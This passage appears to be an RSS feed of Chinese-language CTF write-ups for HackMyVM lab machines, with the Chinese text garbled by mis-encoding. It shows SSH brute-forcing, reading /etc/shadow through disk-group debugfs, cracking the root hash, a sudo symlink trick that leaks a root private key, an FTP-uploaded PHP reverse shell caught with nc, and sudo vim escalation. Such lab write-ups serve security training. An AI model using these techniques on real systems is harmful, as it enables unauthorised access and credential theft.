[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'None' - 16 of 22 [child 15] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'p0w3rf1ll_abc' - 17 of 22 [child 16] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'pr0xy_ch41ns_456' - 18 of 22 [child 17] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 't0p_s3cr3t' - 19 of 22 [child 18] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'th3_b0ss' - 20 of 22 [child 19] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'UnD3sc0n0c1d0' - 21 of 22 [child 20] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'Wh1t3_h4ck' - 22 of 22 [child 21] (0/0)
[REDO-ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 23 of 27 [child 1] (1/5)
[22][ssh] host: 192.168.205.145   login: spectre   password: 5p3ctr3_p0is0n_xX
[STATUS] attack finished for 192.168.205.145 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20
```

ÁôªÂΩï

```
www-data@medusa:/...$ ls /home/
spectre
www-data@medusa:/...$ su - spectre
Password: 
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

diskÊàëËÆ∞ÂæóÂ•ΩÂÉèÂèØ‰ª•ÊèêÊùÉ

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group

```
#Êü•ÁúãÁ≥ªÁªüÂàÜÂå∫ÂíåÊñá‰ª∂Á≥ªÁªü‰ø°ÊÅØ
df -h
#‰ΩøÁî®debugfsÊü•ÁúãÊñá‰ª∂
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.9G  2.1G  4.5G  32% /
udev            471M     0  471M   0% /dev
tmpfs           489M     0  489M   0% /dev/shm
tmpfs            98M  504K   98M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ debugfs /dev/sda1
-bash: debugfs: command not found
spectre@medusa:~$ which debugfs
spectre@medusa:~$ find / -name debugfs 2&gt;/dev/null
/usr/sbin/debugfs
spectre@medusa:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/id_rsa
/root/.ssh/id_rsa: File not found by ext2_lookup 
debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
```

ÊãøÂéªÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' &gt; hash
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (root)   
1g 0:00:00:06 DONE (2025-02-04 18:39) 0.1455g/s 544.9p/s 544.9c/s 544.9C/s 19871987..street
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                 
```

ÁôªÂΩï

```
debugfs:  exit
debugfs: Unknown request 'exit'.  Type '?' for a request list.
debugfs:  
debugfs:  quit
spectre@medusa:~$ su -
Password: 
root@medusa:~# id
uid=0(root) gid=0(root) groups=0(root)
```


&lt;!-- ##{'timestamp':1738666533}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Medusa.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>panghu</title><link>https://7r1UMPHK.github.io/post/panghu.html</link><description>Ë£ôuÁöÑÊèêÊùÉÈ¢ò

![image-20250331190451295](https://7r1umphk.github.io/image/20250331190451337.png)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo arp-scan -l     
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.147 08:00:27:86:a6:d2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:6e:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh ssh@192.168.205.147
The authenticity of host '192.168.205.147 (192.168.205.147)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.147' (ED25519) to the list of known hosts.
ssh@192.168.205.147's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~$ cat /opt/lzh.sh 
#!/bin/sh

cd /home/ssh
cat backup/hi
jan:~$ cd /home/ssh/backup/
jan:~/backup$ ls -al
total 12
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 .
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 ..
-rw-------    1 root     root             9 Feb  3 23:28 hi
```

ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÊòØÊúâÊùÉÈôêÊîπÁõÆÂΩïÁöÑÔºå‰ΩÜÊòØ‰∏çËÉΩÂà†Èô§

```
jan:~/backup$ cd ..
jan:~$ ls -la
total 12
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 backup
jan:~$ mv backup/ backup1
jan:~$ mkdir backup
jan:~$ cd backup
jan:~$ cd backup
jan:~/backup$ ln -s /root/root.txt hi
jan:~/backup$ sudo /opt/lzh.sh 
flag{LingMj}
```

ÁÑ∂ÂêéÊàëÂ∞±ÂéªËØªÂèñÂØÜÈí•Âíåshadow‰∫ÜÔºåÊàë‰ª•‰∏∫Ê≤°Êúâid_rsaÂ∞±ÊòØÊ≤°ÊúâÂØÜÈí•ÔºåÊàëÂ∞±Ê≤°ÁúãÔºåÂì™Áü•ÈÅì

![image-20250331190502904](https://7r1umphk.github.io/image/20250331190503009.png)

hahaÊàëÁúüÂÇª

```
jan:~/backup$ rm hi 
jan:~/backup$ sudo /opt/lzh.sh 
#       $OpenBSD: sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

# Include configuration snippets before processing this file to allow the
# snippets to override directives set in this file.
Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
strictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      ~/.ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
#KbdInteractiveAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of 'PermitRootLogin prohibit-password'.
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
#UsePAM no

#AllowAgentForwarding yes
# Feel free to re-enable these if your use case requires them.
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem       sftp    internal-sftp

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
jan:~/backup$ rm hi 
jan:~/backup$ ln -s /root/.ssh/id_ed25519 hi
jan:~/backup$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~/backup$ sudo /opt/lzh.sh
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ nano id
jan:~/backup$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ chmod 600 id 
jan:~/backup$ ssh -i id root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

&lt;!-- ##{'timestamp':1738666533}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPHK.github.io/post/hmv_friendly.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Friendly
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.129
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
Nmap scan report for 192.168.205.129
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

# 2.Ë∏©ÁÇπ

ÂÖàËøõË°åftpÂåøÂêçÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.129
Connected to 192.168.205.129.
220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
Name (192.168.205.129:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||17885|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
```

ÂíåÊàë‰ª¨ÂèëÁé∞ÁöÑÁΩëÈ°µÁõÆÂΩïÊû∂ÊûÑ‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØï‰∏ä‰º†‰∏Ä‰∏™ÂèçÂºπshell‰∏äÂéªËÆøÈóÆ

```
ftp&gt; put php.php 
local: php.php remote: php.php
229 Entering Extended Passive Mode (|||22559|)
150 Opening BINARY mode data connection for php.php
100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
226 Transfer complete
2596 bytes sent in 00:00 (241.58 KiB/s)
ftp&gt; ls
229 Entering Extended Passive Mode (|||7798|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
226 Transfer complete
```

ËÆøÈóÆ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (439): Inappropriate ioctl for device
bash: no job control in this shell
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```
www-data@friendly:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Mar 11  2023 .
drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
drwxr-xr-x   3 root root  4096 Feb 21  2023 home
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Feb 21  2023 lost+found
drwxr-xr-x   3 root root  4096 Feb 21  2023 media
drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
drwx------   3 root root  4096 Mar 11  2023 root
drwxr-xr-x  17 root root   540 Feb  2 23:26 run
lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
drwxr-xr-x  12 root root  4096 Feb 21  2023 var
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@friendly:/$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

![image-20250331191435274](https://7r1umphk.github.io/image/20250331191435317.png)

üîóhttps://gtfobins.github.io/gtfobins/vim/#sudo

```
www-data@friendly:/$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_friendly.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPHK.github.io/post/Listen.html</link><description># 0.ÁÆÄ‰ªã

ËøôÊòØ‰∏Ä‰∏™Áæ§ÂèãÁöÑÈù∂Êú∫ÔºåÊàë‰∏çÁü•ÈÅì‰ªñÂèë‰∏çÂèëÂ∏ÉÔºåÊâÄ‰ª•Â∞±ÁúãÁúãÂêßÔºåÂ≠¶‰π†Â≠¶‰π†

ÁõÆÊ†á IPÔºö192.168.205.137
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.137
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:15 CST
Nmap scan report for 192.168.205.137
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 - \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:97:BD:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
                                                                
```

# 2.Ë∏©ÁÇπ

![image-20250331190947415](https://7r1umphk.github.io/image/20250331190947584.png)

ÊµãÊñá‰ª∂ÂåÖÂê´ÔºåÊµãÂÆå‰∫Ü‰πüÊ≤°ÁªìÊûúÔºåÊâÄ‰ª•Êù•‰∏™ÁõÆÂΩïÁàÜÁ†¥ÂÖà

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u http://192.168.205.137 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.137
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, md, txt]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
200      GET       48l      102w     2359c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        7l       10w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET        3l        1w       16c http://192.168.205.137/test.php
200      GET        2l        1w       17c http://192.168.205.137/tools.php
200      GET        1l        3w      228c http://192.168.205.137/README.md
200      GET        2l        1w       15c http://192.168.205.137/pp.php
```

Êé¢Á¥¢‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/test.php                
&lt;h1&gt;test&lt;/h1&gt;


                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/tools.php
&lt;h1&gt;tools&lt;/h1&gt;
 
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/pp.php   
&lt;h1&gt;test&lt;/h1&gt;

                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/README.md
